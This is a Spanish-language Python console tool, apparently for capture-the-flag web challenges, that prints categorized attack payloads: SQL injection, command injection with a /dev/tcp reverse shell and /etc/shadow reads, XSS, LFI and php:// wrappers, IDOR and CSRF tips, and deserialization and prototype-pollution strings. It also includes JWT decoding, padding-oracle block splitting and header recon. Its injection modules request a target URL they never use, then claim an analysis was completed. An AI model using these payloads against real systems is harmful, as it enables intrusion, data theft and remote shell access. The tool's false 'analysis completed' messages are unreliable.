# ctfassistant/main.py - Versión 5.1 (Inyección Masiva)
# -*- coding: utf-8 -*-

import sys
import requests
import urllib.parse
import base64
import hashlib
import json
import binascii
import re
from typing import Dict, List, Any

class CTFAssistant:
    
    def __init__(self):
        self.payloads = self._load_payloads()
        
    def _load_payloads(self) -> Dict[str, Any]:
        return {
            "sqli": {
                "1. Pruebas de Citas/Comentarios (Bypass de Filtros)": [
                    "' --", "') --", "'; --", '") --', '" --', "') or 1=1 --", 
                    "' OR '1'='1", "admin' --", 
                    "admin' or '1'='1'#",
                    "\\' or 1=1 --",
                    "admin') union select 1,2,3 --",
                    "1; SELECT * FROM users; --",
                    "1' AND 1=1 UNION SELECT null,null,null --",
                    "1' OR 1=1 -- -",
                    "1' OR '1' = '1"
                ],
                "2. Bypass de Login y Booleanos": [
                    "admin' OR 1=1#",
                    "' OR 'a'='a",
                    "'='",
                    "' OR 1=1 -- -",
                    "admin' AND 1=0 UNION SELECT 'admin', 'password'",
                    "1' XOR 1=1",
                    "1' or 1=1 limit 1 --",
                    "1' OR 1 GROUP BY 'a' HAVING 'a'='a"
                ],
                "3. Extracción de Datos y Versión (MySQL)": [
                    " ORDER BY N --",
                    " UNION SELECT 1,2,3... --",
                    " UNION SELECT 1, database(), user() --",
                    " UNION SELECT 1, @@version, 3 --",
                    " UNION SELECT 1, group_concat(schema_name), 3 FROM information_schema.schemata --",
                    " UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema='NOMBRE_DB' --",
                    " UNION SELECT 1, group_concat(column_name, 0x3a, table_name), 3 FROM information_schema.columns WHERE table_name='NOMBRE_TABLA' --",
                    " 1' AND substring(@@version,1,1)='5' -- -",
                    " 1 AND 1=1 AND 1=1"
                ],
                "4. SQLi Tiempos (Time-Based Blind)": [
                    "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='1",
                    "' AND IF(1=1, SLEEP(5), 0) --",
                    "1 OR (SELECT(CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END))"
                ]
            },
            "command_injection": {
                "1. Separadores y Encadenamiento Común": ["&", "&&", "|", ";", "\n", "%0a", "%0d", "$()"],
                "2. Pruebas de Ejecución (Linux)": [
                    "TARGET; ls -la", "TARGET && cat /etc/passwd", "`whoami`", 
                    "TARGET%0als -la", "TARGET|/bin/bash -c 'ls /'", 
                    "TARGET; /bin/bash -i >& /dev/tcp/IP/PORT 0>&1 # (Reverse Shell)",
                    "TARGET| awk 'BEGIN {system(\"whoami\")}'",
                    "TARGET%0a cat /etc/shadow",
                    "$(id)",
                    "TARGET; export PATH=/usr/bin:$PATH; bash"
                ],
                "3. Bypass de Filtros (Strings y Wildcards)": [
                    "TARGET; echo 'pwned' > pwned.txt",
                    "TARGET; cat /etc/pass*d",
                    "TARGET; w'h'o'a'm'i",
                    "TARGET; /???/??? /???/p?ss?d"
                ],
                "4. Pruebas en Windows": [
                    "TARGET& ping 127.0.0.1",
                    "TARGET & whoami",
                    "TARGET | type C:\\Windows\\win.ini"
                ]
            },
            "xss": {
                "1. Básico y Tags de Imagen/SVG": [
                    "<script>alert(document.domain)</script>",
                    "<img src=x onerror=alert(1)>",
                    "<svg onload=alert(1)>",
                    "<body onpageshow=alert(1)>",
                    "<details open ontoggle=alert(1)>",
                    "<iframe src=javascript:alert(1)></iframe>"
                ],
                "2. Bypass de Filtros y Codificación": [
                    "';alert(1)//", "')alert(1)//", 
                    "\'\"-alert(1)-\'\"`",
                    "xss<script>/* no spaces */alert(1)</script>",
                    "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
                    "<img/src=\"x\"onerror=\"alert(1)\">"
                ],
                "3. Event Handlers Avanzados": [
                    "<a href=\"javascript:alert(1)\">ClickMe</a>",
                    "<input onfocus=alert(1) autofocus>",
                    "<video src=x onerror=alert(1)>",
                    "<isindex action=javascript:alert(1) type=image>",
                    "<marquee onstart=alert(1)>"
                ],
                "4. XSS Reflejado en API/JSON": [
                    '"}))</script><script>alert(1)</script>',
                    "';-alert(1)//",
                    "';}}}</script><svg onload=alert(1)//"
                ]
            },
            "lfi": {
                "1. Archivos Críticos (Linux)": [
                    "../../../../../etc/passwd", 
                    "../../../../../etc/shadow", 
                    "../../../../../proc/self/environ",
                    "../../../../../proc/self/cmdline",
                    "../../../../../var/log/apache2/access.log",
                    "../../../../../var/log/apache/access.log"
                ],
                "2. Wrappers y Encoding Avanzado": [
                    r"..\..\..\..\windows\system32\drivers\etc\hosts",
                    "php://filter/read=convert.base64-encode/resource=index.php", 
                    "php://input",
                    "data:text/plain,<?php system('id'); ?>",
                    "....//....//....//....//etc/passwd",
                    "/etc/passwd%00"
                ]
            },
            "authz": {
                "1. Controles de Acceso (IDOR)": [
                    "Cambia id=1 por id=2 o id=admin",
                    "Modifica user_id de tu cookie/token a user_id:1 (admin)",
                    "Cambia /api/v1/user/me por /api/v1/user/1"
                ],
                "2. Bypass de Lógica/Flujo": [
                    "Omite un paso de multi-paso (ej: eliminar el parámetro 'step=2')",
                    "Reenvía la respuesta de la función 'disable_account()' como true/1",
                    "Fuerza navegación a 'admin.php' directamente."
                ],
                "3. Ataques a Sesión (CSRF / Fijación)": [
                    "Busca tokens CSRF en formularios y reúsalo o elimínalo.",
                    "Intenta la petición POST/PUT sin el encabezado 'Referer'."
                ]
            },
            "logic_fuzz": {
                "1. Fuzzing Básico de Parámetros": [
                    "'", '"', '`', '\\', ';', '|', '&', '>', '<', '*', '..%2f',
                    '0', '1', '-1', 'true', 'false', 'admin', 'root'
                ],
                "2. Headers Fuzzing": [
                    "X-Forwarded-For: 127.0.0.1",
                    "X-Original-URL: /admin",
                    "Referer: https://malicious.com",
                    "Host: 127.0.0.1"
                ]
            },
            "serialization": {
                "1. PHP Object Injection (Explotación)": [
                    'O:7:"MyClass":1:{s:8:"username";s:5:"admin";}',
                    'a:2:{i:0;s:11:"admin";i:1;s:8:"password";}'
                ],
                "2. JSON Deserialization (Payloads clave)": [
                    '{"$type":"Gadget_Chain, Assembly"}',
                    '{"username":"admin", "isAdmin":true}',
                    '{"__proto__": {"isAdmin": true}}'
                ]
            }
        }

    def show_payloads(self, type: str):
        map_titles = {
            "sqli": "[📚] PAYLOADS DE SQL INJECTION AVANZADOS [📚]",
            "command_injection": "[📚] PAYLOADS DE COMMAND INJECTION (LINUX/WINDOWS) [📚]",
            "xss": "[📚] PAYLOADS DE XSS Y MANIPULACIÓN DE APIs [📚]",
            "lfi": "[📚] PAYLOADS DE LFI / PATH TRAVERSAL [📚]",
            "authz": "[📚] PAYLOADS DE AUTORIZACIÓN Y SESIÓN [📚]",
            "logic_fuzz": "[📚] FUZZING BÁSICO DE LÓGICA Y HEADERS [📚]",
            "serialization": "[📚] SERIALIZACIÓN Y LÓGICA DE NEGOCIO [📚]"
        }
        
        print(f"\n{map_titles.get(type, '[📚] PAYLOADS [📚]')}")
        print("-" * 50)
        
        for category, payload_list in self.payloads[type].items():
            print(f"**{category}**")
            for p in payload_list:
                print(f"   -> {p}")
            print("-" * 15)

    def tool_sqli(self):
        print("\n[🛠️] Módulo: SQL Injection (SQLi)")
        target_url = input("URL objetivo (ej: http://e.com/page.php?id=1): ")
        self.show_payloads("sqli")
        input("\n[✅] Análisis de SQLi completado. Presiona ENTER para volver al menú...")

    def tool_command_injection(self):
        print("\n[🛠️] Módulo: Command Injection")
        target_url = input("URL objetivo (ej: http://e.com/ping.php?host=127.0.0.1): ")
        self.show_payloads("command_injection")
        input("\n[✅] Análisis de Command Injection completado. Presiona ENTER para volver al menú...")

    def tool_xss(self):
        print("\n[🛠️] Módulo: XSS Payload Generator & Tester")
        target_url = input("URL objetivo (ej: http://e.com/search.php?q=TEST): ")
        self.show_payloads("xss")
        input("\n[✅] Análisis de XSS completado. Presiona ENTER para volver al menú...")
        
    def tool_lfi(self):
        print("\n[🛠️] Módulo: LFI / Path Traversal (Ing. Inversa)")
        target_url = input("URL objetivo (ej: http://e.com/page.php?file=index.php): ")
        self.show_payloads("lfi")
        input("\n[✅] Análisis de LFI completado. Presiona ENTER para volver al menú...")

    def tool_authz(self):
        print("\n[🛠️] Módulo: Autenticación, Autorización y Sesiones")
        print("--------------------------------------------------")
        print("💡 **Objetivo:** Enfócate en cambiar parámetros de usuario y roles en peticiones.")
        
        self.show_payloads("authz")
        
        print("\n[🔍] Puntos Clave para Ataques a Sesión/Autorización:")
        print("  - **IDOR:** Busca cambiar ID's en URL, JSON o Parámetros.")
        print("  - **CSRF:** Examina si la petición POST/PUT requiere un token secreto. Si no lo requiere, es vulnerable.")
        print("  - **Escalada:** Intenta cambiar el valor de tu rol ('user' a 'admin') en cookies o payloads de POST/JSON.")
        
        input("\n[✅] Análisis de Autorización/Sesiones completado. Presiona ENTER para volver al menú...")

    def tool_logic_analysis(self):
        while True:
            print("\n╔══════════════════════════════════════════╗")
            print("║ [4.1] LÓGICA DE NEGOCIO Y SERIALIZACIÓN  ║")
            print("╠══════════════════════════════════════════╣")
            print("║ 1. Payloads de Serialización (PHP, JSON) ║")
            print("║ 2. Fuzzing Básico (Parámetros/Headers)   ║")
            print("║ 9. Volver al Menú Principal              ║")
            print("╚══════════════════════════════════════════╝")
            
            choice = input("Selecciona una opción: ")
            
            if choice == '1':
                self.show_payloads("serialization")
                print("\n💡 **Punto Clave:** Estos payloads se inyectan en cookies, parámetros de POST o archivos que se serializan/deserializan.")
                input("\n[✅] Análisis de Serialización completado. Presiona ENTER para continuar...")
            elif choice == '2':
                self.show_payloads("logic_fuzz")
                print("\n💡 **Punto Clave:** Prueba estos valores en todos los parámetros, incluyendo los ocultos, cookies y encabezados HTTP.")
                input("\n[✅] Análisis de Fuzzing completado. Presiona ENTER para continuar...")
            elif choice == '9':
                break
            else:
                print("Opción no válida. Inténtalo de nuevo.")


    def tool_crypto_analysis(self):
        while True:
            print("\n╔══════════════════════════════════════════╗")
            print("║   [3.2] MENÚ DE CRIPTOGRAFÍA AVANZADA    ║")
            print("╠══════════════════════════════════════════╣")
            print("║ 1. Analizador de Cadenas (Base64, Hex, JWT)║")
            print("║ 2. Generador de Bloques (Padding Oracle) ║")
            print("║ 9. Volver al Menú Anterior               ║")
            print("╚══════════════════════════════════════════╝")
            
            choice = input("Selecciona una opción: ")
            
            if choice == '1':
                self._analyzer_crypto_string()
            elif choice == '2':
                self._tool_padding_generator()
            elif choice == '9':
                break
            else:
                print("Opción no válida. Inténtalo de nuevo.")


    def _analyzer_crypto_string(self):
        print("\n[🛠️] Analizador de Cadenas (Codificación y Hashing)")
        print("-----------------------------------------------------")
        data = input("Ingresa la cadena a analizar (Ej: Hex, Base64, JWT): ").strip()

        if not data:
            print("❌ Entrada vacía.")
            return

        print("\n[🔍] Resultados de Análisis:")
        
        if data.count('.') == 2:
            print("=" * 50)
            print("[🔑] Token JWT Detectado:")
            try:
                header_b64, payload_b64, signature = data.split('.')
                
                header_json = base64.urlsafe_b64decode(header_b64 + '==').decode('utf-8', errors='ignore')
                payload_json = base64.urlsafe_b64decode(payload_b64 + '==').decode('utf-8', errors='ignore')
                
                print(f"   -> HEADER: {json.dumps(json.loads(header_json), indent=2)}")
                print(f"   -> PAYLOAD: {json.dumps(json.loads(payload_json), indent=2)}")
                print(f"   -> FIRMA: {signature}")
                print("\n   💡 **Ataques JWT Clave:** 1. Cambiar 'alg' a 'none'. 2. Modificar el PAYLOAD.")
            except Exception:
                print(f"   ❌ No es un JWT decodificable.")
            print("=" * 50)
        
        try:
            decoded_b64 = base64.b64decode(data).decode('utf-8', errors='ignore')
            if len(data) > 10 and len(decoded_b64) < len(data) * 0.9:
                 print(f"[*] Base64 Decodificado: {decoded_b64[:100]}{'...' if len(decoded_b64) > 100 else ''}")
        except:
            pass
            
        decoded_url = urllib.parse.unquote(data)
        if decoded_url != data:
            print(f"[*] URL Decodificado: {decoded_url}")

        if all(c in '0123456789abcdefABCDEF' for c in data) and len(data) % 2 == 0:
             try:
                decoded_hex = binascii.unhexlify(data).decode('utf-8', errors='ignore')
                print(f"[*] Hex Decodificado: {decoded_hex[:100]}{'...' if len(decoded_hex) > 100 else ''}")
             except binascii.Error:
                 pass
        
        try:
            decoded_b85 = base64.a85decode(data.encode('ascii')).decode('utf-8', errors='ignore')
            if len(data) > 10 and len(decoded_b85) < len(data) * 0.9:
                 print(f"[*] Base85 Decodificado: {decoded_b85[:100]}{'...' if len(decoded_b85) > 100 else ''}")
        except:
             pass

        print("\n[🔐] Hashing:")
        print(f"   -> MD5: {hashlib.md5(data.encode()).hexdigest()}")
        print(f"   -> SHA256: {hashlib.sha256(data.encode()).hexdigest()}")
        
        input("\n[✅] Análisis completado. Presiona ENTER para continuar...")

    def _tool_padding_generator(self):
        print("\n[🛠️] Generador de Bloques (Padding Oracle - AES-CBC)")
        print("-------------------------------------------------------")
        
        ciphertext = input("Ingresa el Ciphertext (en Hex) o Base64: ").strip()
        block_size_str = input("Ingresa el tamaño del bloque (Típicamente 16 para AES): ").strip()
        
        try:
            block_size = int(block_size_str)
        except ValueError:
            print("❌ El tamaño del bloque debe ser un número entero.")
            return

        try:
            if all(c in '0123456789abcdefABCDEF' for c in ciphertext) and len(ciphertext) % 2 == 0:
                cipher_bytes = binascii.unhexlify(ciphertext)
            else:
                cipher_bytes = base64.b64decode(ciphertext)
        except Exception:
            print("❌ Error al decodificar: Ingresa Hex o Base64 válido.")
            return

        print(f"\n[🔍] Análisis de Bloques (Tamaño: {block_size} bytes):")
        
        if len(cipher_bytes) % block_size != 0:
            print(f"⚠️ Advertencia: El tamaño de los datos ({len(cipher_bytes)} bytes) no es un múltiplo del tamaño del bloque ({block_size} bytes).")
            return
            
        blocks = [cipher_bytes[i:i + block_size] for i in range(0, len(cipher_bytes), block_size)]

        print(f"[*] Número de Bloques Detectados: {len(blocks)}")
        
        for i, block in enumerate(blocks):
            print(f"   -> Bloque {i}: {block.hex()} (Tamaño: {len(block)})")

        if len(blocks) >= 2:
            print("\n[💡] **Para Ataques Padding Oracle (AES-CBC):**")
            print("   - El primer bloque es el **IV (Vector de Inicialización)**.")
            print(f"\n[*] IV (Bloque 0): {blocks[0].hex()}")
            print(f"[*] C1 (Bloque 1): {blocks[1].hex()}")
            
            padding_byte = bytes([1]) * block_size
            print("\n[🛠️] Bloque de Manipulación Útil (Un Byte de Padding):")
            print(f"   - Bloque de 1 byte de padding: {padding_byte.hex()}")
            print("   - **Usa este bloque y XORéalo con el IV para manipular el último byte del texto plano.**")

        input("\n[✅] Generador de Bloques completado. Presiona ENTER para continuar...")

    def tool_recon(self):
        print("\n[🛠️] Módulo: Reconocimiento (Headers & Tech)")
        print("---------------------------------------------")
        target_url = input("Ingresa la URL base (ej: http://ejemplo.com): ")
        
        try:
            response = requests.get(target_url, timeout=5)
            
            print(f"\n[🔗] URL Probada: {target_url}")
            print(f"[*] Código de Estado HTTP: {response.status_code}")
            
            print("\n[🔍] Encabezados de Respuesta:")
            interesting_headers = ["Server", "X-Powered-By", "Content-Type", "Set-Cookie", "Location", "X-Frame-Options", "Content-Security-Policy"]
            for header in interesting_headers:
                if header in response.headers:
                    print(f"   -> {header}: {response.headers[header]}")
            
            if response.cookies:
                print("\n[🍪] Cookies (Sesiones):")
                for cookie in response.cookies:
                    print(f"   -> {cookie.name}: {cookie.value}")
                    if cookie.name.lower() in ['session', 'token', 'jwt']:
                        print("      💡 Posible token de sesión crítico.")

            techs = []
            if 'X-Powered-By' in response.headers: techs.append(response.headers['X-Powered-By'])
            if 'PHPSESSID' in response.cookies: techs.append("PHP")
            if 'ASP.NET' in response.headers: techs.append("ASP.NET")

            if techs:
                print(f"\n[💡] Posibles Tecnologías Detectadas: {', '.join(set(techs))}")

        except requests.exceptions.RequestException as e:
            print(f"❌ Error de conexión: {e}")
            
        input("\n[✅] Análisis de Reconocimiento completado. Presiona ENTER para volver al menú...")

    def show_injection_menu(self):
        while True:
            print("\n╔══════════════════════════════════════════╗")
            print("║        [1] MENÚ DE INYECCIÓN             ║")
            print("╠══════════════════════════════════════════╣")
            print("║ 1. SQL Injection (SQLi) Tool             ║")
            print("║ 2. Command Injection Tool                ║") 
            print("║ 9. Volver al Menú Principal              ║")
            print("╚══════════════════════════════════════════╝")
            
            choice = input("Selecciona una opción o (Ctrl+C para salir): ")
            
            if choice == '1':
                self.tool_sqli()
            elif choice == '2':
                self.tool_command_injection()
            elif choice == '9':
                break
            else:
                print("Opción no válida. Inténtalo de nuevo.")

    def show_security_menu(self):
        while True:
            print("\n╔══════════════════════════════════════════╗")
            print("║     [2] MENÚ DE SEGURIDAD ESPECÍFICA     ║")
            print("╠══════════════════════════════════════════╣")
            print("║ 1. XSS Payload Generator                 ║")
            print("║ 2. LFI / Path Traversal Tool             ║")
            print("║ 3. Authz & Sesiones (CSRF, IDOR)         ║") 
            print("║ 9. Volver al Menú Principal              ║")
            print("╚══════════════════════════════════════════╝")
            
            choice = input("Selecciona una opción o (Ctrl+C para salir): ")
            
            if choice == '1':
                self.tool_xss()
            elif choice == '2':
                self.tool_lfi()
            elif choice == '3':
                self.tool_authz()
            elif choice == '9':
                break
            else:
                print("Opción no válida. Inténtalo de nuevo.")

    def show_utilities_menu(self):
        while True:
            print("\n╔══════════════════════════════════════════╗")
            print("║      [3] MENÚ DE UTILIDADES AVANZADAS    ║")
            print("╠══════════════════════════════════════════╣")
            print("║ 1. Reconocimiento (Ing. Inversa/Headers) ║")
            print("║ 2. Criptografía y Tokens                 ║") 
            print("║ 3. Lógica de Negocio y Serialización     ║")
            print("║ 9. Volver al Menú Principal              ║")
            print("╚══════════════════════════════════════════╝")
            
            choice = input("Selecciona una opción o (Ctrl+C para salir): ")
            
            if choice == '1':
                self.tool_recon()
            elif choice == '2':
                self.tool_crypto_analysis()
            elif choice == '3':
                self.tool_logic_analysis()
            elif choice == '9':
                break
            else:
                print("Opción no válida. Inténtalo de nuevo.")

    def main_menu(self):
        while True:
            try:
                print("\n╔══════════════════════════════════════════╗")
                print("║     [🔥] CTF WEB ASSISTANT V5.1 [🔥]     ║")
                print("╠══════════════════════════════════════════╣")
                print("║ 1. Ataques de Inyección (SQLi, Command)  ║")
                print("║ 2. Seguridad Específica (XSS, LFI, AuthZ)║")
                print("║ 3. Utilidades Avanzadas (Recon, Crypto, Lógica)║")
                print("║ 4. Salir (Ctrl+C también funciona)       ║")
                print("╚══════════════════════════════════════════╝")
                
                choice = input("Selecciona una opción: ")
                
                if choice == '1':
                    self.show_injection_menu()
                elif choice == '2':
                    self.show_security_menu()
                elif choice == '3':
                    self.show_utilities_menu()
                elif choice == '4':
                    print("\n¡Éxito en tus retos! ¡Hasta pronto! 👋")
                    sys.exit(0)
                else:
                    print("Opción no válida. Inténtalo de nuevo.")

            except KeyboardInterrupt:
                print("\n\n¡Herramienta finalizada! ¡Buena suerte! 🚀")
                sys.exit(0)
                
            except Exception as e:
                print(f"\nOcurrió un error inesperado (Tipo: {type(e).__name__}, Mensaje: {e}).") 
                input("Presiona ENTER para volver al menú...")

def main():
    assistant = CTFAssistant()
    assistant.main_menu()

if __name__ == "__main__":
    main()
